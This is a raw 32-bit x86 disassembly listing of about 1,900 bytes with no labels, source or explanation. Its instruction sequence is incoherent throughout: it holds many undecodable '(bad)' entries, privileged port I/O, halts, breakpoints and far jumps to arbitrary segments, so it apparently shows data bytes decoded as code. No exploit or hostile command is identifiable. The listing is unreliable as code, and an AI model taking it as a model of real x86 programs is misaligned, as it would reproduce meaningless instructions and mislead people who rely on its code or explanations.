  698c3e:	push   ebx
  698c3f:	xchg   edx,eax
  698c40:	mov    ds:0xc3340127,eax
  698c45:	imul   esp,DWORD PTR [ebx-0x7b],0xffffffaf
  698c49:	pop    edx
  698c4a:	ja     0x698c87
  698c4c:	jns    0x698c29
  698c4e:	aam    0xd8
  698c50:	mov    eax,0x8a72f58e
  698c55:	inc    eax
  698c56:	call   0x2d5549fa
  698c5b:	int3   
  698c5c:	out    dx,al
  698c5d:	in     al,0xd
  698c5f:	sar    al,0x70
  698c62:	(bad)
  698c65:	call   0x3c2d36a5
  698c6a:	dec    eax
  698c6b:	cdq    
  698c6c:	ret    
  698c6d:	mov    bl,0x3b
  698c6f:	loop   0x698c90
  698c71:	mov    al,ds:0xe89302c0
  698c76:	hlt    
  698c77:	fcom   QWORD PTR [edx+0x5fe338c0]
  698c7d:	mov    WORD PTR [edx+0x73],ss
  698c80:	jge    0x698cc1
  698c82:	mov    ds:0xe0e49580,al
  698c87:	lock pop edx
  698c89:	loope  0x698cd4
  698c8b:	jmp    0xf85eb005
  698c90:	xchg   DWORD PTR [edx-0x4e682874],edi
  698c96:	mov    ecx,0x36861370
  698c9b:	mov    al,ds:0xe2a080b5
  698ca0:	xor    ecx,esi
  698ca2:	cmp    edx,0xffffff97
  698ca5:	test   BYTE PTR [eax+0x5fc8916e],cl
  698cab:	jno    0x698c6f
  698cad:	inc    ecx
  698cae:	dec    ebp
  698caf:	and    eax,0xec928b0d
  698cb4:	mov    ebx,0xa7f4a25
  698cb9:	(bad)  
  698cba:	sub    esi,DWORD PTR [edi+0x62]
  698cbd:	mov    cl,0xd8
  698cbf:	(bad)  
  698cc0:	stc    
  698cc1:	dec    esp
  698cc2:	inc    edx
  698cc3:	inc    edi
  698cc4:	call   0xb8a6:0x1d424774
  698ccb:	xor    esp,DWORD PTR [esi]
  698ccd:	cmp    BYTE PTR [ebx],0x47
  698cd0:	and    BYTE PTR [ebx-0x48],bl
  698cd3:	bound  eax,QWORD PTR [eax]
  698cd5:	push   DWORD PTR ss:[eax+ecx*1+0x7c]
  698cda:	arpl   WORD PTR [esi-0x6a],ax
  698cdd:	ss popf 
  698cdf:	adc    al,0xec
  698ce1:	mov    eax,0x14134b11
  698ce6:	dec    eax
  698ce7:	dec    edx
  698ce8:	jnp    0x698d54
  698cea:	jp     0x698cb2
  698cec:	or     edx,ebp
  698cee:	mov    al,ds:0xce7b9a44
  698cf3:	pop    edi
  698cf4:	outs   dx,DWORD PTR ds:[esi]
  698cf5:	xchg   edi,eax
  698cf6:	or     esi,esp
  698cf8:	loop   0x698d03
  698cfa:	test   esi,eax
  698cfc:	adc    BYTE PTR [edi-0x5501bb5b],0xf8
  698d03:	jno    0x698d68
  698d05:	scas   eax,DWORD PTR es:[edi]
  698d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  698d07:	or     al,0xcf
  698d09:	add    ebp,edi
  698d0b:	push   ebx
  698d0c:	sub    BYTE PTR [eax],bl
  698d0e:	lea    esi,[ecx-0x3911557c]
  698d14:	xor    bl,BYTE PTR [edx]
  698d16:	push   edi
  698d17:	fbld   TBYTE PTR [edi+0x1a]
  698d1a:	loope  0x698cd7
  698d1c:	add    esi,DWORD PTR [edi+0x19135993]
  698d22:	lahf   
  698d23:	cld    
  698d24:	outs   dx,BYTE PTR ds:[esi]
  698d25:	dec    ecx
  698d26:	lock jecxz 0x698d54
  698d29:	pop    ecx
  698d2a:	sub    BYTE PTR [ecx-0x7c],dh
  698d2d:	pop    ecx
  698d2e:	cld    
  698d2f:	push   edi
  698d30:	mov    eax,0x7363f8dd
  698d35:	in     eax,0x9b
  698d37:	sbb    bh,BYTE PTR [ebp-0x5a2f6e25]
  698d3d:	push   ecx
  698d3e:	lock popf 
  698d40:	je     0x698cdb
  698d42:	rcl    BYTE PTR [esi+0x4951d900],0xeb
  698d49:	inc    edx
  698d4a:	xor    eax,0xc0b5206d
  698d4f:	jno    0x698cd1
  698d51:	ss ffree st(2)
  698d54:	adc    al,0x5d
  698d56:	sbb    DWORD PTR [ecx],0x92bfbe74
  698d5c:	pop    es
  698d5d:	outs   dx,DWORD PTR ds:[esi]
  698d5e:	xor    DWORD PTR [edx],ebp
  698d60:	xchg   ecx,eax
  698d61:	es inc ebx
  698d63:	push   ds
  698d64:	mov    edi,0x80a31c66
  698d69:	mov    ebp,0x9a221aed
  698d6e:	retf   
  698d6f:	popf   
  698d70:	pop    DWORD PTR [eax-0x326fa45b]
  698d76:	add    bx,WORD PTR [ebx-0x32]
  698d7a:	sbb    al,0x2
  698d7c:	mov    dh,0xd4
  698d7e:	jb     0x698d8f
  698d80:	xor    ch,BYTE PTR cs:[ecx-0x3f9e3d17]
  698d87:	mov    dl,0x34
  698d89:	pop    ds
  698d8a:	mov    ebp,0x67b6c1b7
  698d8f:	scas   al,BYTE PTR es:[edi]
  698d90:	jbe    0x698daa
  698d92:	in     al,0x5d
  698d94:	jecxz  0x698ddb
  698d96:	sahf   
  698d97:	(bad)  
  698d98:	fdiv   st(7),st
  698d9a:	jae    0x698dde
  698d9c:	fidiv  WORD PTR [ecx]
  698d9e:	push   ecx
  698d9f:	fcmove st,st(3)
  698da1:	ror    DWORD PTR [eax],cl
  698da3:	push   edx
  698da4:	mov    dl,0xa0
  698da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698da7:	mov    ecx,0x73e0c036
  698dac:	jne    0x698dbc
  698dae:	outs   dx,BYTE PTR ds:[esi]
  698daf:	or     ebx,DWORD PTR [edi-0x53e8a866]
  698db5:	push   ds
  698db6:	mov    dl,0xbc
  698db8:	sahf   
  698db9:	or     eax,0x1f90660b
  698dbe:	test   BYTE PTR [edi+0x2ab7fa20],bl
  698dc4:	out    dx,eax
  698dc5:	push   edi
  698dc6:	push   ebx
  698dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  698dc8:	or     al,0x44
  698dca:	cmp    DWORD PTR [edi],eax
  698dcc:	sbb    ecx,ebp
  698dce:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698dd0:	adc    al,0x37
  698dd2:	pop    es
  698dd3:	dec    edi
  698dd4:	mov    gs,ecx
  698dd6:	mov    bl,0xed
  698dd8:	mov    bh,cl
  698dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698ddb:	pop    eax
  698ddc:	or     eax,0x42769e28
  698de1:	pusha  
  698de2:	push   edx
  698de3:	mov    ds:0x3e0ed4cb,al
  698de8:	or     eax,0x58847e1f
  698ded:	hlt    
  698dee:	ret    0xb056
  698df1:	cmp    DWORD PTR [edi+0x4b],ebx
  698df4:	cmp    esi,eax
  698df6:	sbb    al,BYTE PTR [edi]
  698df8:	sub    eax,0xb47fcf1d
  698dfd:	jge    0x698d9c
  698dff:	stc    
  698e00:	sub    cl,BYTE PTR [eax+ebp*1]
  698e03:	adc    BYTE PTR [edx+0x50],0x41
  698e07:	arpl   WORD PTR [ebx+ecx*4+0x430f95f4],ax
  698e0e:	idiv   BYTE PTR [edi+0x19]
  698e11:	pop    ebx
  698e12:	add    al,0x2a
  698e14:	cld    
  698e15:	adc    eax,0xf965634
  698e1a:	mov    ebx,0x36d0237a
  698e1f:	adc    dl,BYTE PTR [edx+edi*8+0x6e]
  698e23:	scas   al,BYTE PTR es:[edi]
  698e24:	sub    al,0x14
  698e26:	mov    al,ds:0x2872a5d9
  698e2b:	inc    ecx
  698e2c:	sar    dl,1
  698e2e:	(bad)
  698e31:	clc    
  698e32:	mov    es,WORD PTR [esi+0x11]
  698e35:	int3   
  698e36:	je     0x698e6f
  698e38:	out    0x0,al
  698e3a:	xchg   ecx,eax
  698e3b:	mov    dl,0xa5
  698e3d:	add    al,0xa7
  698e3f:	popf   
  698e40:	and    esp,DWORD PTR [ecx+edx*8]
  698e43:	pop    esi
  698e44:	scas   eax,DWORD PTR es:[edi]
  698e45:	es stos BYTE PTR es:[edi],al
  698e47:	mov    edx,0x685ffe18
  698e4c:	xchg   ecx,eax
  698e4d:	sahf   
  698e4e:	int    0xe7
  698e50:	mov    esi,0x8be4d86d
  698e55:	dec    ecx
  698e56:	ds adc al,0x1c
  698e59:	push   esp
  698e5a:	or     DWORD PTR [ebp-0x216c37af],edx
  698e60:	xor    cl,BYTE PTR [ecx-0x18]
  698e63:	cdq    
  698e64:	or     cl,cl
  698e66:	retf   0x11d0
  698e69:	lods   eax,DWORD PTR ds:[esi]
  698e6a:	inc    ecx
  698e6b:	test   DWORD PTR [ecx],ecx
  698e6d:	ficomp DWORD PTR [ecx+0x3ea79c54]
  698e73:	adc    ah,bh
  698e75:	(bad)  
  698e76:	rcl    eax,1
  698e78:	fnstenv [eax+0x65a2386]
  698e7e:	cmp    ch,bh
  698e80:	xor    DWORD PTR [edx],eax
  698e82:	das    
  698e83:	add    cl,BYTE PTR [edx-0xa]
  698e86:	add    BYTE PTR [esi],ah
  698e88:	inc    edx
  698e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698e8a:	inc    esi
  698e8b:	ret    
  698e8c:	outs   dx,DWORD PTR ds:[esi]
  698e8d:	xchg   DWORD PTR [esi+0x48],edi
  698e90:	push   cs
  698e91:	(bad)  
  698e92:	cdq    
  698e93:	scas   al,BYTE PTR es:[edi]
  698e94:	or     bl,BYTE PTR [eax+ebx*2+0x3b]
  698e98:	inc    esi
  698e99:	mov    ecx,0xece4cbfa
  698e9e:	sub    edx,eax
  698ea0:	imul   ebp,DWORD PTR [esi],0xcfdbff02
  698ea6:	add    ebx,ecx
  698ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698ea9:	nop
  698eaa:	les    ebp,FWORD PTR [edx-0x2b5d5c16]
  698eb0:	inc    edx
  698eb1:	mov    edi,0xd1c6841b
  698eb6:	sbb    al,0x4a
  698eb8:	mov    dh,0x1d
  698eba:	jmp    0xf76139e4
  698ebf:	scas   al,BYTE PTR es:[edi]
  698ec0:	mov    bl,0xa8
  698ec2:	xor    al,0x6
  698ec4:	inc    ebp
  698ec5:	jp     0x698e6a
  698ec7:	or     eax,0x4d63e7cc
  698ecc:	lods   eax,DWORD PTR ds:[esi]
  698ecd:	jmp    0x8b6b7a25
  698ed2:	sbb    al,0x30
  698ed4:	cmp    DWORD PTR [bx+si-0x7c],0x8a6e5189
  698edc:	push   ebx
  698edd:	loope  0x698f45
  698edf:	(bad)  [ebp+0x18513be3]
  698ee5:	adc    ebp,DWORD PTR [eax+0x5584ba31]
  698eeb:	fistp  DWORD PTR [edi-0x2c0f74fe]
  698ef1:	les    esp,FWORD PTR ds:0xdf58117b
  698ef7:	xchg   esp,eax
  698ef8:	cmp    ah,ch
  698efa:	mov    ecx,0x2ec77941
  698eff:	xchg   ebp,eax
  698f00:	(bad)  
  698f02:	mov    dh,0x68
  698f04:	mov    DWORD PTR [ecx-0x44ef37eb],ebp
  698f0a:	stos   DWORD PTR es:[edi],eax
  698f0b:	outs   dx,BYTE PTR ds:[esi]
  698f0c:	sub    eax,0x1919f388
  698f11:	xor    edi,DWORD PTR [ebx-0x4eac2018]
  698f17:	retf   0xd5ee
  698f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  698f1b:	pop    ds
  698f1c:	pop    ss
  698f1d:	outs   dx,DWORD PTR ds:[esi]
  698f1e:	mov    ebp,edi
  698f20:	dec    ecx
  698f21:	jmp    0x698eb5
  698f23:	jnp    0x698efe
  698f25:	mov    eax,0xb23065af
  698f2a:	lea    ebx,[edx]
  698f2c:	jmp    0x876e:0xf75fdcb1
  698f33:	inc    DWORD PTR [esi]
  698f35:	dec    eax
  698f36:	mov    dh,BYTE PTR [eax-0x4]
  698f39:	mov    cl,0x9b
  698f3b:	lods   eax,DWORD PTR ds:[esi]
  698f3c:	popf   
  698f3d:	das    
  698f3e:	js     0x698f84
  698f40:	dec    ecx
  698f41:	push   edx
  698f42:	mov    ebx,0x702f210e
  698f47:	test   BYTE PTR [ebp-0x1c16be53],bh
  698f4d:	rcl    BYTE PTR [ebx-0x34bd4ab1],0x69
  698f54:	call   0xa2bb:0xbce247cc
  698f5b:	(bad)  
  698f5d:	outs   dx,BYTE PTR ds:[esi]
  698f5e:	push   esi
  698f5f:	sub    ah,BYTE PTR es:[ebp+0x4]
  698f63:	in     al,0x52
  698f65:	cmp    dl,BYTE PTR [edi]
  698f67:	ins    BYTE PTR es:[edi],dx
  698f68:	jnp    0x698fd5
  698f6a:	mov    gs,WORD PTR ds:[esi]
  698f6d:	cs jg  0x698fa1
  698f70:	(bad)  
  698f71:	jno    0x698f54
  698f73:	(bad)  
  698f74:	fldl2t 
  698f76:	inc    BYTE PTR ds:0x6dc0cf88
  698f7c:	xchg   DWORD PTR [eax+0x6db15bba],ebx
  698f82:	fwait
  698f83:	out    dx,al
  698f84:	jno    0x698f2d
  698f86:	mov    eax,0x97e77f16
  698f8b:	push   ss
  698f8c:	mov    edx,0x8611d098
  698f91:	aad    0xf4
  698f93:	sub    ecx,DWORD PTR [eax]
  698f95:	fiadd  WORD PTR [ebp+0x62017d19]
  698f9b:	mov    ds:0x50650162,eax
  698fa0:	sar    DWORD PTR [eax+0x57],1
  698fa3:	repz into 
  698fa5:	add    eax,0xf918ffc4
  698faa:	sti    
  698fab:	jmp    DWORD PTR [esi+0x46]
  698fae:	push   0xffffffff
  698fb0:	test   eax,0xd0d8e51
  698fb5:	jmp    0x698fa4
  698fb7:	leave  
  698fb8:	mov    ds:0x39a94630,eax
  698fbd:	call   0x1243daee
  698fc2:	es and ebx,ebx
  698fc5:	faddp  st(2),st
  698fc7:	and    al,0x3
  698fc9:	int    0x79
  698fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698fcc:	inc    eax
  698fcd:	out    dx,al
  698fce:	cld    
  698fcf:	inc    esi
  698fd0:	shr    DWORD PTR [eax-0x54587b7b],0x2d
  698fd7:	dec    ebp
  698fd8:	aad    0x17
  698fda:	test   BYTE PTR [esi-0x1a647415],al
  698fe0:	mov    bh,BYTE PTR [esi-0x4cbb89f1]
  698fe6:	ss (bad) 
  698fe8:	in     eax,dx
  698fe9:	add    DWORD PTR cs:[ecx+eiz*1],esi
  698fed:	(bad)  
  698fee:	pop    edx
  698fef:	sbb    BYTE PTR [edi-0x3d3b1d05],dl
  698ff5:	adc    DWORD PTR [ebx+eiz*4+0x3bfa4f7e],eax
  698ffc:	push   ecx
  698ffd:	and    ah,BYTE PTR [esi+ecx*2]
  699000:	sbb    eax,esi
  699002:	adc    ebx,eax
  699004:	adc    ch,al
  699006:	mov    eax,0xfed9d489
  69900b:	popf   
  69900c:	sar    DWORD PTR [ecx-0x61],0x7f
  699010:	das    
  699011:	out    dx,al
  699012:	loopne 0x698fda
  699014:	jbe    0x69900c
  699016:	dec    eax
  699017:	aad    0xf
  699019:	mov    dl,0x15
  69901b:	call   0x32d6e722
  699020:	push   ebp
  699021:	jle    0x69902a
  699023:	inc    edi
  699024:	js     0x69909d
  699026:	xor    eax,0x4c6a44b
  69902b:	addr16 ds (bad) 
  69902e:	dec    eax
  69902f:	lahf   
  699030:	dec    ebx
  699031:	dec    eax
  699032:	and    ebp,DWORD PTR [edx-0x5ef43692]
  699038:	test   DWORD PTR [ebx+0x13],ecx
  69903b:	inc    ecx
  69903c:	ret    0xea13
  69903f:	popa   
  699040:	mov    edi,0x58c06772
  699045:	test   DWORD PTR [ebp-0x78],0xa399780b
  69904c:	jne    0x69906c
  69904e:	add    DWORD PTR [eax-0x4e],ecx
  699051:	dec    esi
  699052:	ins    DWORD PTR es:[edi],dx
  699053:	sub    esi,0x0
  699056:	mov    ds:0x9b16ffd3,eax
  69905b:	fdivp  st(1),st
  69905d:	fsubr  st,st(0)
  69905f:	pop    eax
  699060:	test   eax,0xe47ac769
  699065:	mov    gs,WORD PTR [ebx]
  699067:	repnz mov ebp,0xa6c0a00b
  69906d:	or     ebp,eax
  69906f:	jl     0x69906d
  699071:	adc    al,0x14
  699073:	bswap  esi
  699075:	inc    esp
  699076:	sbb    BYTE PTR [ebp+0x14],bh
  699079:	sbb    DWORD PTR [edx+ecx*4],edx
  69907c:	ja     0x69904c
  69907e:	pushf  
  69907f:	mov    ah,0x21
  699081:	aad    0xde
  699083:	mov    ds:0xa1e3d440,eax
  699088:	loopne 0x699108
  69908a:	out    dx,al
  69908b:	inc    eax
  69908c:	dec    ebp
  69908d:	dec    ebx
  69908e:	bound  ebp,QWORD PTR [eax+0x6d24d142]
  699094:	call   0x18bd:0xc25d77df
  69909b:	fbstp  TBYTE PTR ds:0xa1bc88de
  6990a1:	aad    0xae
  6990a3:	fbld   TBYTE PTR [edi+0x7a]
  6990a6:	test   al,0x2b
  6990a8:	jns    0x69905f
  6990aa:	xor    al,0x76
  6990ac:	xchg   edx,eax
  6990ad:	xchg   ecx,eax
  6990af:	push   ecx
  6990b0:	xor    dl,BYTE PTR [ebx]
  6990b2:	push   ecx
  6990b3:	leave  
  6990b4:	pop    esi
  6990b5:	cmp    eax,0xb7be5ccd
  6990ba:	into   
  6990bb:	nop
  6990bc:	xor    eax,0xe9c2a82a
  6990c1:	gs nop
  6990c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6990c4:	push   edx
  6990c5:	(bad)  
  6990c6:	loope  0x699056
  6990c8:	cdq    
  6990c9:	sti    
  6990ca:	jbe    0x699144
  6990cc:	ja     0x6990a8
  6990ce:	fsubr  QWORD PTR [ebp-0x51]
  6990d1:	and    eax,0x97720734
  6990d6:	sub    eax,0xe4e32cd0
  6990db:	lahf   
  6990dc:	xor    eax,edx
  6990de:	cs addr16 xchg esi,eax
  6990e1:	aas    
  6990e2:	call   0x48c849d3
  6990e7:	cmp    cl,BYTE PTR [edi+0x6b5e4b7e]
  6990ed:	call   0xe5e7:0x8218d8fb
  6990f4:	ret    0xc425
  6990f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6990f8:	mov    cs,WORD PTR [esi+eax*2+0x6a]
  6990fc:	xchg   ecx,eax
  6990fd:	pop    eax
  6990fe:	mov    bh,0x6c
  699100:	inc    edi
  699101:	add    DWORD PTR [esi-0x7f],edx
  699104:	sti    
  699105:	mov    edx,esi
  699107:	mov    al,0xd0
  699109:	pop    ebx
  69910a:	xor    dh,BYTE PTR ds:0x8627199a
  699110:	xor    eax,0xe4d036c4
  699115:	push   cs
  699116:	std    
  699117:	iret   
  699118:	imul   ebp,DWORD PTR [eax+0x9],0x77
  69911c:	adc    BYTE PTR [ebx+0x31],ah
  69911f:	out    dx,al
  699120:	fmul   DWORD PTR [ebx-0x4c5b74eb]
  699126:	mov    dl,0xaf
  699128:	addr16 (bad) 
  69912a:	xor    cl,BYTE PTR [ebp+0x3ca8b8aa]
  699130:	xor    eax,0x882c82b0
  699135:	pop    ebp
  699136:	jge    0x6991b6
  699138:	xchg   ebp,eax
  699139:	sbb    edx,DWORD PTR [eax+0x4b]
  69913c:	fld    QWORD PTR [ebp-0x2e]
  69913f:	cmp    al,0xae
  699141:	lods   eax,DWORD PTR ds:[esi]
  699142:	add    ah,cl
  699144:	sahf   
  699145:	nop
  699146:	jne    0x6991b9
  699148:	maskmovq mm0,(bad)
  699149:	test   DWORD PTR [esi-0x7f648da4],0x5ec938c5
  699153:	inc    eax
  699154:	loope  0x6990f8
  699156:	js     0x6990e5
  699158:	int    0x7f
  69915a:	inc    DWORD PTR [eax+0x677dd4d2]
  699160:	jmp    DWORD PTR [edx]
  699162:	cdq    
  699163:	inc    ebx
  699164:	pop    esp
  699165:	icebp  
  699166:	bound  eax,QWORD PTR [eax]
  699168:	xchg   esp,eax
  699169:	addr16 inc esp
  69916b:	test   bl,al
  69916d:	outs   dx,DWORD PTR ds:[esi]
  69916e:	pop    esi
  69916f:	pop    es
  699170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  699171:	nop
  699172:	repz push ecx
  699174:	or     eax,0x2c442c04
  699179:	in     al,dx
  69917a:	mov    ebx,0x612bb01
  69917f:	adc    edi,DWORD PTR [eax-0x5eeb4548]
  699185:	arpl   WORD PTR [edx+0x3],di
  699188:	inc    ecx
  699189:	jnp    0x6991a8
  69918b:	add    al,0xdb
  69918d:	pop    ecx
  69918e:	inc    ebp
  69918f:	loop   0x69916f
  699191:	cmp    al,0xed
  699193:	push   ds
  699194:	into   
  699195:	aad    0x71
  699197:	cld    
  699198:	cmc    
  699199:	les    edi,FWORD PTR [eax-0x68ca990e]
  69919f:	fisttp QWORD PTR [ebx-0x4df0b811]
  6991a5:	jmp    0x66df:0x18b09dbc
  6991ac:	mov    DWORD PTR [bx+si+0x1e],edx
  6991b0:	push   ds
  6991b1:	popa   
  6991b2:	cdq    
  6991b3:	aaa    
  6991b4:	idiv   DWORD PTR [ebp+ebp*4-0x38ecf190]
  6991bb:	mov    cl,0xd
  6991bd:	shl    eax,1
  6991bf:	add    al,ah
  6991c1:	mov    dh,0xac
  6991c3:	jmp    0x5ba5a6b5
  6991c8:	lods   eax,DWORD PTR ds:[esi]
  6991c9:	pop    edi
  6991ca:	pop    edi
  6991cb:	or     BYTE PTR [ebp-0x2e],0x82
  6991cf:	je     0x6991ab
  6991d1:	out    dx,al
  6991d2:	test   eax,eax
  6991d4:	inc    edx
  6991d5:	rcr    DWORD PTR [ebx],0x71
  6991d8:	mov    edx,0x76afd544
  6991dd:	(bad)  
  6991de:	jl     0x699213
  6991e0:	sub    esp,esp
  6991e2:	cmp    DWORD PTR [esi],esi
  6991e4:	nop
  6991e5:	int    0xf5
  6991e7:	jl     0x69917d
  6991e9:	pusha  
  6991ea:	ins    BYTE PTR es:[edi],dx
  6991eb:	jle    0x6991e2
  6991ed:	ret    0x3aaa
  6991f0:	out    dx,al
  6991f1:	outs   dx,DWORD PTR ds:[esi]
  6991f2:	pop    ecx
  6991f3:	shl    ebx,1
  6991f5:	clc    
  6991f6:	dec    eax
  6991f7:	add    ah,BYTE PTR [edx+0x2d2fd29c]
  6991fd:	push   0xe2515e73
  699202:	add    edi,DWORD PTR [ecx-0x23a84c1c]
  699208:	fsub   QWORD PTR [eax+esi*8+0x3f06c048]
  69920f:	aad    0x5d
  699211:	pop    edx
  699212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  699213:	inc    ebp
  699214:	fs je  0x6991d0
  699217:	jle    0x699246
  699219:	push   DWORD PTR [ebx+0x5f264785]
  69921f:	int3   
  699220:	out    dx,eax
  699221:	xor    edi,DWORD PTR [ebx+0x673449f9]
  699227:	repz mul dl
  69922a:	add    cl,BYTE PTR [esi-0x8566436]
  699230:	inc    ebp
  699231:	out    dx,eax
  699232:	cs loope 0x6992a8
  699235:	ins    BYTE PTR es:[edi],dx
  699236:	call   0xf00d:0x50cebe10
  69923d:	cli    
  69923e:	xor    DWORD PTR [ecx-0x692ca2ee],esp
  699244:	adc    al,0xfe
  699246:	push   ds
  699247:	cdq    
  699248:	sbb    eax,DWORD PTR [ebp+0x2d]
  69924b:	sub    dh,BYTE PTR [edx+0x2e]
  69924e:	mov    eax,edi
  699250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  699251:	out    0xea,eax
  699253:	push   cs
  699254:	push   0x3b
  699256:	adc    cl,BYTE PTR [esi+ebp*8]
  699259:	lea    eax,ds:0x3a422edd
  69925f:	push   edx
  699260:	shl    ecx,1
  699262:	data16 fwait
  699264:	or     DWORD PTR [esi],edx
  699266:	or     ah,BYTE PTR [eax+0x5c]
  699269:	sahf   
  69926a:	push   0x1eb90bd2
  69926f:	jmp    0xf4f:0x8794483d
  699276:	xlat   BYTE PTR ds:[ebx]
  699277:	pop    eax
  699278:	lds    edi,FWORD PTR [edx+0x38]
  69927b:	test   al,0x4f
  69927d:	and    esp,DWORD PTR [esi]
  69927f:	mov    esi,0x77edfb08
  699284:	jb     0x69922b
  699286:	sub    ah,BYTE PTR [edx-0x1919aea0]
  69928c:	jo     0x699243
  69928e:	arpl   WORD PTR [ecx],di
  699290:	jl     0x699225
  699292:	mov    dh,BYTE PTR [edi]
  699294:	and    al,BYTE PTR [eax]
  699296:	cmp    DWORD PTR [ecx],esp
  699298:	push   eax
  699299:	dec    ebx
  69929a:	xor    DWORD PTR [esi+0x5d],0x78
  69929e:	ret    
  69929f:	and    al,0x73
  6992a1:	test   al,0x1b
  6992a3:	sub    DWORD PTR [edx-0x37],esi
  6992a6:	push   ds
  6992a7:	and    dh,BYTE PTR [esi-0x450f1951]
  6992ad:	push   0xd2a1d404
  6992b2:	aam    0x4c
  6992b4:	add    eax,0xd88fcb30
  6992b9:	aad    0xe8
  6992bb:	das    
  6992bc:	dec    ebp
  6992bd:	xchg   BYTE PTR [edi],bh
  6992bf:	or     esi,esp
  6992c1:	and    esp,ebx
  6992c3:	sub    esp,DWORD PTR [ebp-0x1cca4e9e]
  6992c9:	stos   BYTE PTR es:[edi],al
  6992ca:	pop    esp
  6992cb:	int3   
  6992cc:	mov    WORD PTR [eax+edi*2-0x5d],es
  6992d0:	push   ds
  6992d1:	ins    BYTE PTR es:[edi],dx
  6992d2:	mov    esp,0x9bf0bb85
  6992d7:	shl    DWORD PTR [eax-0x37],cl
  6992da:	jne    0x699264
  6992dc:	jmp    0x699355
  6992de:	pop    ss
  6992df:	mov    bh,0x90
  6992e1:	cmc    
  6992e2:	in     al,0x87
  6992e4:	add    BYTE PTR [ebp-0x21],ah
  6992e7:	imul   ecx,DWORD PTR [ebp-0x31],0x34
  6992eb:	and    al,0x6a
  6992ed:	fild   QWORD PTR [ebx-0x2e412b9c]
  6992f3:	lahf   
  6992f4:	sub    eax,0x4f669d58
  6992f9:	adc    eax,0xae80f929
  6992fe:	jp     0x69930d
  699300:	xchg   ecx,eax
  699301:	lahf   
  699302:	xchg   BYTE PTR [ebp+0x5dbb75bb],bh
  699308:	cs aas 
  69930a:	mov    DWORD PTR [ecx-0x5f],esi
  69930d:	push   ebx
  69930e:	mov    eax,ds:0x1a4734b2
  699313:	xchg   edi,eax
  699314:	ret    0x724b
  699317:	pop    edx
  699318:	mov    edx,DWORD PTR ds:0x2c07f8b9
  69931e:	mov    BYTE PTR [edx],bl
  699320:	and    bl,ch
  699322:	scas   al,BYTE PTR es:[edi]
  699323:	imul   ebp,DWORD PTR [ebp-0xa],0xfd776c46
  69932a:	ret    
  69932b:	adc    al,0x36
  69932d:	inc    ebp
  69932e:	imul   esp,DWORD PTR [edx],0x775151d3
  699334:	pusha  
  699335:	lods   eax,DWORD PTR ds:[esi]
  699336:	push   esi
  699337:	call   0xf8c3:0x8e00094e
  69933e:	adc    DWORD PTR [ebx-0x66],esi
  699341:	jmp    0xf795:0x58672a8a
  699348:	push   eax
  699349:	test   DWORD PTR [ecx+0x48915274],edi
  69934f:	xchg   ebx,eax
  699350:	aam    0x72
  699352:	xor    DWORD PTR [eax+0x1b6d5079],edi
  699358:	add    ebx,DWORD PTR [ecx+eax*1-0x3b23552b]
  69935f:	and    edx,esp
  699361:	add    ch,dl
  699363:	jp     0x69938f
  699365:	imul   esi,edi,0x65
  699368:	or     ch,BYTE PTR [eax-0x62]
  69936b:	pop    esi
  69936c:	mov    esi,0x3845269b
  699371:	jnp    0x6993cd
  699373:	fwait
  699374:	loopne 0x6993aa
  699376:	mov    dl,0xfc
  699378:	adc    esp,ebp
  69937a:	add    BYTE PTR [ebp+0x4a6c1c20],cl
  699380:	mov    gs,ebp
  699382:	hlt    
  699383:	inc    esp
  699384:	call   0x13803555
  699389:	mov    edi,0x2cc8162
  69938e:	out    0x70,eax
  699390:	out    dx,al
  699391:	add    eax,0xd6608597
  699396:	sub    BYTE PTR ds:0x5c78eb81,ah
  69939c:	mov    ch,0x1e
  69939e:	(bad)  
  69939f:	lahf   
  6993a0:	loope  0x6993a6
  6993a2:	pop    ebp
  6993a3:	sub    ch,0xc8
  6993a6:	inc    eax
  6993a7:	jecxz  0x6993a1
  6993a9:	adc    eax,0xad8394a5
  6993ae:	mov    es:0xfc2baedc,eax
  6993b4:	test   DWORD PTR [ebp-0x4],esp
  6993b7:	sar    BYTE PTR [ecx+0x14f49d67],1
  6993bd:	cwde   
  6993be:	pop    esi
  6993bf:	push   ebx
  6993c0:	ud1    edx,DWORD PTR [edx-0x80]
  6993c4:	ja     0x6993ee
  6993c6:	(bad)  
  6993c8:	xlat   BYTE PTR ds:[ebx]
  6993c9:	jne    0x6993e9
  6993cb:	outs   dx,DWORD PTR ds:[esi]
  6993cc:	jecxz  0x699432
  6993ce:	and    eax,DWORD PTR [eax+0x6a]
  6993d1:	addr16 cli 
  6993d3:	adc    BYTE PTR [ebx+ebx*2+0x7e],bl
  6993d7:	or     DWORD PTR [ebp-0x4e],ebp
  6993da:	jmp    0x6993da
  6993dc:	mov    edx,0xe4a89856
  6993e1:	sbb    al,0x4f
  6993e3:	aaa    
  6993e4:	pop    edx
  6993e5:	mov    fs,WORD PTR [esi+0x5b]
  6993e8:	jl     0x6993aa
  6993ea:	cmp    eax,0xc3bc533c
  6993ef:	rol    dh,cl
  6993f1:	loop   0x6993f0
  6993f3:	and    DWORD PTR [edi-0x51],edi
  6993f6:	pop    ss
  6993f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6993f8:	jb     0x699410
  6993fa:	push   edi
  6993fb:	repz (bad) 
  6993fd:	mov    ds:0xeea03310,al
  699402:	aas    
  699403:	mov    bl,0xb6
  699405:	cmovp  edx,DWORD PTR [ebx-0x5c]
  699409:	in     al,0x3f
  69940b:	dec    esp
  69940c:	dec    ecx
  69940d:	shl    DWORD PTR [ebp+edi*8+0x47],cl
  699411:	add    edi,DWORD PTR gs:0x7feb847b
  699418:	ja     0x6993aa
  69941a:	test   eax,0x93a0e60e
  69941f:	pop    ss
